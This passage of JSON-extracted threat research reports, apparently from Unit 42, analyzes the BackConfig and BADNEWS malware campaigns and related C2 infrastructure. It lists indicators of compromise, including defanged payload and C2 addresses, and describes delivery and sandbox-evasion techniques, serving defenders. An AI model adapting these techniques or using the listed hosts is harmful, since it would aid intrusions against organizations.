            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using this meta-data, together with information gleaned from infrastructure investigation, Unit 42 were able to pivot around on AutoFocus data to find additional BackConfig PE executable samples.",
                "Those samples from the last 12 months are listed in Tables 1 and 2 below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "Describing PE compile times and Digital signatures used, ordered by first seen."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Compilation Time stored in executable (SHA256: 84e5629...) appears to be after the point at which the file was first seen by our WildFire analysis system.",
                "While the PE file timestamp could be modified post-compilation, the oddity is more likely explained away with time zones -- 2349 Pacific time on the 19th is 1349 in Bangladesh on the 20th, and 7:26am UTC is in the range of 11:26 to 13:26 across the South Asia region, which would make the sample compilation quite recent with respect to the delivery of it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "More details about the self-signed digital certificates, as well as full hashes, can be found in the IOCs section at the end of this report."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following table shows the version information from the same PE files, grouped by similar File Description fields.",
                "The order remains the same, except for the sample (SHA256: 18ce3ee...) which was first seen January 16th, 2020 but for some reason reverted to using exact version information seen in samples two to three months prior.",
                "Namely, Link Finder."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. Describing PE version info metadata, ordered by first seen and grouped on matching data."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Of the set, the file (SHA256: 1510996...) has most consistency in terms of a theme, using the Foxit Copyright information, self-signed digital signature and even using the company logo, as shown in the Figure below, for the executable files icon.",
                "The files copyright information only differs from that of Foxits Reader software by a missing period symbol, implying it was copied rather than created."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The actors then moved to use seemingly fictitious company and product names while using a mixture of signer names in their digital signatures.",
                "No file icons were used at all over the last 11 months."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Recent samples also included Cyrillic text in the file description, product name, and copyright fields, as shown and translated in the table above.",
                "Its hard to know if this is an attempt to set false flags as to the origins of the BackConfig malware, or perhaps to make the content more relevant to specific targets within the victim organizations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this section, we describe how the various payloads are delivered based on what we have seen in our customer networks, as well as what we have established through open-source research.",
                "Unit 42 has yet to see any evidence of weaponized documents used to deliver BackConfig being attached on phishing emails and that phishing URL links in emails appear to be the Hangover groups modus operandi."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The remainder of this section focuses largely on Object Linking and Embedding (OLE)",
                "Microsoft Excel documents, as they are most commonly used by the Hangover group, at least when it comes to the BackConfig malware.",
                "Through infrastructure analysis however, Unit 42 was able to find a BackConfig PE sample (SHA256: e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f; first seen 10/24/2019) using the C2 domain matissues[.]com and dropped by the weaponised Rich Text Format (RTF) file (SHA256: 752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f) from the same day.",
                "The RTF used the CVE-2017-11882 exploit against equation editor vulnerabilities in Office applications to execute the PE sample which was a unique exploitation method compared to all other samples analyzed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Continuing to pivot on data obtained from the samples found thus far, we discovered some related URLs relating to compromised third-party infrastructure supporting the delivery of the BackConfig malware.",
                "The following table lists some examples of compromised sites delivering weaponised XLS files with filenames, such as Circular_No_03.xls (SHA256: 0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf) and Circullar_Nov_2017.xls (SHA256: ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb) implying (even with incorrect spelling) that the contents is, or relates to, a letter or advertisement which is distributed to a large number of people."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3. Compromised third-party infrastructure to support delivery of BackConfig."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Given the targeting related to these threats, and the compromised third-party websites, we believe the use of fbr in some of the URLs above likely relates to the Federal Board of Revenue (FBR) government organization of Pakistan.",
                "The fbr theme also runs into the VBA macro code.",
                "File ed638b5... contains the statement Const WelcomePage = \"FBR\"."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The old compromised hosting examples in Table 3 above do not rely on Hypertext Preprocessor (PHP) server-side scripts to deliver the weaponized XLS files.",
                "Instead, the pages simply used HTTP response status 301 (Moved Permanently) for URL redirection to said XLS, initiating the download.",
                "More recent examples make use of PHP with URL filenames matching the social engineering theme, such as fbr.",
                "In addition, the actors use the PHP script to log any visitors to the page noting in a file named info.txt the datetime stamp of the event, the client operating system, and their IP address."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The location of the compromised third-party infrastructure or the organizations legitimately using them, align with the targeting Unit 42 has seen.",
                "This could be pure coincidence, a sign from the threat actors that their intention is to take advantage of weaknesses in the target countrys wider infrastructure, or the threat actors leveraging in-country infrastructure that may be considered more trustworthy by the intended victims and their security solutions."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks WildFire sandbox analyzed sample ed638b5... on November 8th, 2017, and, as described in the table above, the sample was hosted on two compromised websites: a Bangladesh school and a Maldivan shipping agency.",
                "While Unit 42 has not seen Hangover activity in the Maldives, the archipelago is in the region alongside other known targets and interestingly, swore in a new President about a week after Unit 42 analyzed the sample."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The EXE payload (SHA256: 4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd) downloaded directly by the VBA code in sample ed638b5... from the URL below relates to those documented by BitDefender here.",
                "To date, Unit 42 has only seen 6 similar samples since the late-2017 timeframe for this sample, compared to many more prior, perhaps indicating a change over of the custom payloads used by the Hangover group.",
                "Certainly, there are some overlaping Tactics Techniques and Procedures (TTPs) between the older samples and the more recent BackConfig samples."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "http://chancetowin.quezknal[.]net/appstore/updatepatch/logs.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Before moving on to describe the most recent samples and installation methods used by the Hangover actors, the timeline figure below provides a high-level view of the evolution in TTPs used."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Despite the evolution over the years, some habits are hard to break.",
                "Firstly, every weaponized XLS Unit 42 has investigated loads a fake error message, such as the one shown in Figure 3 below, to trick the victim into thinking that the file is corrupt and thus nothing has -- or will -- load as intended.",
                "Another fictitious error message text has been used in the past often with poor spelling or grammar."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Similarly, the version information metadata stored in all the Excel documents analyzed share the same Author and Last Modified By names - Testing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following subsections describe the campaigns and malware as highlighted by the three most recent milestones in the timeline figure above."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Registration Form.xls (SHA256: be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461) listed in Table 3 above provides an example of the types of lures used by the threat actors."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon opening the XLS and enabling the macro code, the picture in Figure 4 below is shown on top white-background cells.",
                "As the filename suggests, its a registration form and relates to the Naya Pakistan Housing program run by the Pakistani government to help solve the housing shortfall in the country.",
                "Eligible citizens include government employees and registration forms were due by October 15th, 2019 (extended through November 15th), meaning the timing and the lure of the campaign on October 25th were clearly planned to increase the chances of compromise."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As the PHP webpages did not exist at the time of writing, Unit 42 cannot prove the XLS file be3f12b... was hosted at the URL listed in row 1 of Table 3 above.",
                "However, because of the following points, we have high confidence in the campaign relationship between the two."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The VBA macro code in the XLS file be3f12b... differed somewhat from that of the samples of the previous years.",
                "Instead of directly storing encoded EXE files or running batch shell commands directly from the VBA code itself, it retrieved the content from hidden columns in the Excel sheet, starting at column 27 or AA, which is likely to be off-screen for most people.",
                "Once the font colour was changed, the setup batch code component as per previous variants, and the new Visual Basic Script (VBS) downloader component were revealed in columns AA and AB, respectively, as shown in figure 5 below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Macro VBA code in the XLS parses the content of the two columns line by line writing the contents to their respective files on disk and executing them following the same process flow as described below in Figure 6."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A more recent weaponized XLS file (SHA256: 021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b) was analyzed by WildFire on November 15th, 2019 and exposed some new techniques.",
                "On this occasion, the VBA macro code contained a decimal-encoded ZIP file of only 1,062 bytes in size.",
                "Inside the ZIP archive were two text files that would be decompressed to a folder driverkit.",
                "One file, driverkit.bat, is the setup BAT file already discussed in this report and listed in the appendix section.",
                "The other file, Winmgt.txt, is an adaptation of the VBS downloaded also described in this report.",
                "However, instead of a direct HTTP download using an MSXML DOM object, this version writes the following contents to Winmgt_Drive.bat, which is executed by a third scheduled task created by the setup BAT file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following execution flow diagram is based on one of the most recent weaponized documents Unit 42 has seen Invoice.xls (SHA256: 8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c; first seen 2020-01-15)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The infection process consists of multiple components as just described.",
                "The setup batch (BAT) file coordinates much of the infection process of the BackConfig plug-in loader once the VBA has written it to disk and executed it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The numbered bullet list below describes Figure 6."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ultimately, the XLS writes two files to disk, one of which -- the BAT -- immediately modifies some system settings and creates two scheduled tasks.",
                "However, this behaviour may not be enough to determine the components as malicious.",
                "Only after 20 minutes will the task scheduler execute the VBS downloader component and launch the BackConfig loader EXE, by which time analysis systems may have stopped monitoring."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following table describes the TTPs associated with the multiple campaigns described in this report."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Hangover group (aka Neon, Viceroy Tiger, MONSOON) is active and targeting, according to Unit 42s visibility, government and military organisations in South Asia using spear-phishing emails containing letters or government forms to lure victims into browsing to compromised websites serving weaponized Excel documents that install the BackConfig Trojan.",
                "Almost exclusively, Unit 42 has seen the use of weaponized documents that require user execution.",
                "Only once in the last six months have we seen use of exploits to circumvent the need for the user to execute any part of the installation chain."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The evolution of BackConfigs primary and secondary payloads has seen different methods used for executing commands and deploying executables both with and without obfuscation."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The latest versions contain modular components making it easier to update and re-use code in order to rapidly deploy their campaigns in a timely manner to have the highest chance of success.",
                "The method in which the latest samples execute also indicates the groups focus on trying to evade sandbox and other automated analysis systems by breaking down malicious activity into chunks that each seem relatively benign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Protections:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.",
                "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
                "For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.",
                "(This is added to blogs pre-shared with the CTA, when loaded into WordPress it will be added when appropriate)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6\n8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c\n021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b\nbe3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461\n0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf\ned638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb\n752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using CVE-2017-11882)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt / .bat from Naya Housing campaign)\nC94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9\n6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3\n750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580\n5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295\nf64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e\n98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e\n29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096 (driverkit.bat)\nabe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003 (Winmgt_Drive.bat uses bitsadmin)\n02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1",
                "(One_drivers.txt / .vbs from Naya Housing campaign)\n952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a (Down_LinkLog.vbs)\na1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs using BITS)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644\n0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92\n84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c\n18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9\n922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709\n4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5\n677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2\nd3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f\n91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1\nde5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a\nf79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b\n9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77\n6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e\ne28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f\n07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda\n31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848\n15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892\nD87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861\n167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e\n4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of older set of downloaders)\nb18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5 (driverkit.zip)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "linkrequest[.]live (23.106.123[.]87)\nmatissues[.]com\nunique.fontsupdate[.]com\n185.203.119[.]184\n212.114.52[.]148"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following list of self-signed digital certificates is not exhaustive, and only relates to those seen on BackConfig PE executables samples over the past twelve months."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "thumbprint: 79635cb32cf16cf6bddfd563b09d7aa99ccb2c01\nissuer: CN=Foxit Software Incorporated\nsubject: CN=Foxit Software Incorporated\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 50:53:ce:ad:42:c2:70:84:4f:55:",
                "bc:76:a4:23:6c:c8\nvalid from: 1/1/2018\nvalid to: 1/1/2024"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "thumbprint: aa9010ff841c67cf8fb88d7f1e86a778b35bcba0\nissuer: CN=wind0ws\nsubject: CN=wind0ws\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70\nvalid from: 1/1/2019\nvalid to: 1/1/2025"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "thumbprint: 01ba433fdc7f9b1ad1baaea6c5fd69243d03d8c3\nissuer: CN=NVIDIA Corporation\nsubject: CN=NVIDIA Corporation\nversion: 3\nalgorithm: sha1WithRSAEncryption\nserial: 6d:39:d4:59:15:9e:8c:b3:41:",
                "da:bd:4c:dd:37:60:e1\nvalid from: 1/1/2019\nvalid to: 1/1/2025"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following VBS and BAT code was extracted from XLS sample (SHA-256: 8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "Drive.txt -> Drive.vbs CODE]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "[",
                "Audio.txt -> Audio.bat CODE]"
            ]
        }
    ],
    "05686e902987c7ba4ef6e20aa22666d19f3db5c5": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nIn the past few months, Unit 42 has observed the Patchwork group, alternatively known as Dropping Elephant and Monsoon, conducting campaigns against targets located in the Indian subcontinent.",
                "Patchwork threat actors utilized a pair of EPS exploits rolled into legitimate, albeit malicious, documents in order to propagate their updated BADNEWS payload.",
                "The use of weaponized legitimate documents is a longstanding operational standard of this group.",
                "The malicious documents seen in recent activity refer to a number of topics, including recent military promotions within the Pakistan Army, information related to the Pakistan Atomic Energy Commission, as well as Pakistans Ministry of the Interior.",
                "The BADNEWS malware payload, which these malicious documents ultimately deliver, has been updated since the last public report in December 2017.",
                "BADNEWS acts as a backdoor for the attackers, providing them with full control over the victim machine.",
                "It has historically leveraged legitimate third-party websites to host the malwares command and control (C2) information, acting as dead drops.",
                "After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers.",
                "Weve observed modifications to how the malware obtains its (C2) server information, as well as modifications to the C2 communication.",
                "These changes to BADNEWS, as well as the use of recent EPS-based exploits, demonstrate that the group are actively updating their toolsets in efforts to stay ahead of the security community.",
                "In this posting, we detail our findings and document these changes.\n\nDelivery\nThe malicious documents that Unit 42 examined contained legitimate decoy lures as well as malicious embedded EPS files targeting the CVE-2015-2545 and CVE-2017-0261 vulnerabilities.",
                "These vulnerabilities are well covered in previous public works, which can be found from PWC and FireEye.",
                "Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability.",
                "The lures are primarily documents of interest to Pakistani nuclear organizations and the Pakistani military as can be seen in the images below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Lure extracted from a67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Lure extracted from 07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Lure extracted from b8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Lure extracted from d486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2 and fd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload from each of the malicious documents is an updated version of the BADNEWS malware family.",
                "When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload.",
                "The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool.",
                "After the files are dropped, the VMwareCplLauncher.exe executable is run, which in turn loads the vmtools.dll DLL file.",
                "This DLL file creates a scheduled task named BaiduUpdateTask1, which attempts to run the malicious, spoofed MSBuild.exe every subsequent minute.",
                "The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past.",
                "The flow of execution from the time the victim opens the malicious Microsoft Word document, to the execution of BADNEWS, may be seen below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Side-loading technique employed to deliver BADNEWS"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following image demonstrates the scheduled task created by the modified vmtools.dll to ensure BADNEWS runs and remains running on the victim machine."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Scheduled task created to load BADNEWS"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BADNEWS",
                "Much of BADNEWS has remained consistent from when it was originally discussed by Forcepoint in August 2016.",
                "Additionally, recent analysis by Trend Micro notes some minor changes during 2017.",
                "To briefly recap, the BADNEWS malware family acts as a backdoor, with communication occurring over HTTP.",
                "A number of commands are provided to the attackers, including the ability to download and execute additional information, upload documents of interest, and take screenshots of the desktop.",
                "The malware collects C2 information when it is originally executed via Dead Drop Resolvers.",
                "Dead drop resolvers have been used by multiple threat actor groups using various malware families and those behind Patchwork are well versed with this tactic.",
                "This tactic uses public web services to host content that contains encoded commands that are decoded by the malware.",
                "For the remainder of the analysis in this research blog, we are discussing the following file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One of the first modifications we witnessed in this new variant of BADNEWS is a new mutex that is created to ensure a single instance of BADNEWS is running at a given moment.",
                "This malware family used the new mutex com_mycompany_apps_appname_new.",
                "This variant of BADNEWS uses different filenames compared to previous versions.",
                "The following filenames are used by BADNEWS throughout its execution.",
                "All of these files reside in the victims %TEMP% directory:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Other changes we noticed in this variant include how the malware obfuscates C2 information stored via dead drop resolvers.",
                "Previous variants of BADNEWS looked for data between {{ and }}, and used a simple cipher to decode this data.",
                "This new variant now looks for data between [[ and ]] in a number of hardcoded URLs.",
                "This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Dead drop resolver used by BADNEWS"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to decrypt this data, the authors have included additional steps from previous versions.",
                "To decode this information, BADNEWS takes the following steps:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A script, which is included in the Appendix, will decrypt data from these dead drop resolvers.",
                "In the example shown above, we are presented with a result of 185.203.118[.]115 after all four steps are taken.",
                "BADNEWS performs many of the expected functions associated with previous versions including keylogging and identifying files of interest.",
                "Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files.",
                "Instead, it looks at fixed drives only.",
                "It continues to seek out files with the following extensions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to prepare for C2 communication, BADNEWS will aggregate various victim information, which is appended to two strings.",
                "These strings have the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "An example of the first string may be seen below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It should be noted that the variables used for this string are different from previous versions.",
                "For example, in the previous variant of BADNEWS, the victims unique identifier was stored under a variable named uid, the username was stored in a variable named u, etc. Additionally, the hardcoded version string of 1.0 is different from previous samples.",
                "C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP.",
                "The following hardcoded URI is used for normal communication with the C2 (note the additional forward slashes):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the event data is uploaded to the attacker, the following hardcoded URI is used (note the use of backslashes):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When initial pings are sent to the remote server, BADNEWS includes one of the two previously created strings containing the victims information.",
                "An example request in a sandboxed environment may be seen below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 Example request made by BADNEWS"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To decrypt the data provided in the POST request, a number of steps are required.",
                "First, the attackers include a series of extra = and & characters within the data stream.",
                "Once these are removed, the data is decoded with base64.",
                "Finally, the result is decrypted using AES-128 and the following static key (hex-encoded):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nThe Patchwork group continues to plague victims located within the Indian subcontinent.",
                "Through the use of relatively new exploits, as well as a constantly evolving malware toolset, they aim to compromise prominent organizations and individuals to further their goals.",
                "Recent activity has shown a number of lures related to the Pakistan Army, the Pakistan Atomic Energy Commission, as well as the Ministry of the Interior.",
                "One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server.",
                "Palo Alto Networks customers are protected against this threat in a number of ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the providers being used for dead drops have been notified.\n\nIndicators of Compromise\nMalicious Word Document SHA256 Hashes\na67220bcf289af6a99a9760c05d197d09502c2119f62762f78523aa7cbc96ef1\n07d5509988b1aa6f8d5203bc4b75e6d7be6acf5055831cc961a51d3e921f96bd\nfd8394b2ff9cd00380dc2b5a870e15183f1dc3bd82ca6ee58f055b44074c7fd4\nb8abf94017b159f8c1f0746dca24b4eeaf7e27d2ffa83ca053a87deb7560a571\nd486ed118a425d902044fb7a84267e92b49169c24051ee9de41327ee5e6ac7c2\n\nBADNEWS SHA256 Hashes\nab4f86a3144642346a3a40e500ace71badc06a962758522ca13801b40e9e7f4a\n290ac98de80154705794e96d0c6d657c948b7dff7abf25ea817585e4c923adb2\n\nC2 Servers\n185.203.118[.]115\n94.156.35[.]204\n\nDead Drop Resolvers\nhxxp://feed43[.]com/8166706728852850.xml\nhxxp://feed43[.]com/3210021137734622.xml\nhxxp://www.webrss[.]com/createfeed.php?feedid=49966\nhxxp://feeds.rapidfeeds[.]com/88604/\n\nScript to Decrypt Dead Drop Resolvers"
            ]
        }
    ],
    "0e3ef960e38e1189ea854aa2e2ce47e7ca90c95e": [
        {
            "type": "paragraph",
            "content": [
                "In April 2017, in collaboration with Clearsky, Palo Alto Networks Unit 42 published an article about our research into targeted attacks in the Middle East.",
                "In that research we discussed two new malware families we named KASPERAGENT and MICROPSIA."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since then, we have continued our research into the Command and Control (C2) infrastructure associated with KASPERAGENT and MICROPSIA.",
                "This ongoing research lead us to a new Middle Eastern campaign.",
                "Our findings from this new campaign include C2 infrastructure, new attack methods, four types of malware (including Android malware), a system for management of stolen victim data and some detail of the actors."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It is notable that our research has shown that this newly-identified attack campaign dates back to at least June 2012, over five years ago."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this blog, we outline the results of our research into this new campaign so far."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our discovery of this new campaign begins where our previous KASPERAGENT and MICROPSIA research left off."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pivoting from Previous KASPERAGENT and MICROPSIA Research\nOne of the C2 servers we observed in our earlier KASPERAGENT and MICROPSIA research was mailsinfo[.]com.",
                "The first IP address that this domain resolved to from about mid-May 2015 through October-November 2015 was 148.251.135[.]117."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We used passive DNS (pDNS) and found the server mail.pal4u[.]net on 148.251.135[.]117 starting mid-May 2015.",
                "We also found other servers on this IP address.",
                "We do not believe this necessarily gives a link between campaigns found on this IP address as it appears to be shared by multiple unrelated third parties.",
                "However, the nature of activity and some malware artifacts on this IP address does suggest a possible link to the Gaza Hackers group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As we followed our leads from the previous KASPERAGENT and MICROPSIA research and dug into the server mail.pal4u[.]net on 148.251.135[.]117 that research led us to find the C2 infrastructure of this new campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Digging into Pal4u\nThe WHOIS for pal4u[.]net appears to be a Palestinian hosting company.",
                "The DNS records for pal4u[.]net gives us, in addition to the WWW hostname, the Name Servers (NS) NS1 and NS2 and additional IP address 195.154.216[.]74."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We found six additional domains that used palu4u[.]net as NS, and which all shared the same historic IP address 195.154.216[.]74 (Figure 2).",
                "From the seven total domains, we observed six as malware Command & Control (C2), exfiltration, malware download servers, and/or in associated malware code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pal4u[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pal2me[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pay2earn[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Shop8d[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ts4shope[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "pal4news[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We only found one of the seven domains associated with this IP, ads4market[.]net, not associated with malware activity.",
                "We did not find any legitimate activity or content associated with these six domains during the period of associated registration."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1- C2 domain links"
            ]
        },
        {
            "type": "paragraph",
            "content": [
